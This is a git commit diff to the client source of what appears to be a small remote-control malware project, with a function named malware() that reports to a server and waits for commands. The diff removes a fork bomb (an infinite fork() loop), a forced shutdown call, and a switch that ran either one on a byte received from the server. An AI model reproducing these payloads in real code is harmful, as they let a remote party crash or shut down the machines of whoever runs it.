72db5c47ef2da9c0ddab84790e0699dd036747e2
Yukenigon <timothee.arnauld1@gmail.com>
2017-10-11 10:20:03 +0200

    Client init

--- src/client/main.c
+++ src/client/main.c
@@ -16,18 +16,6 @@ int main(int argc, char** argv){
     return 0;
 }
 
-
-void shutdown_now(){
-  execl("/bin/shutdown", "-h", "now", NULL);
-}
-
-void infinite_fork(){
-  while(1){
-    fork();
-  }
-}
-
-
 void malware(){
     send(socket_desc, UNDER_CONTROL, strlen(UNDER_CONTROL), 0);
     
@@ -35,28 +23,7 @@ void malware(){
         if(recv(socket_desc, server_reply, 10000, 0) >= 0){
             printf("Message received\n");
             //send(socket_desc, received, strlen(received), 0);
-
-	    //caster ou extraire le chiffre
-	    switch ((int)server_reply[0]){
-	    case 1:
-	      shutdown_now();
-	      break;
-	    case 2:
-	      infinite_fork();
-	      break;
-	    case 3:
-	      //other
-	      break;
-	    default:
-	      //nothing
-	      break;
-	    }
-  
-	}
-
-	
+	   }
     }
     close(socket_desc);
 }
-
-
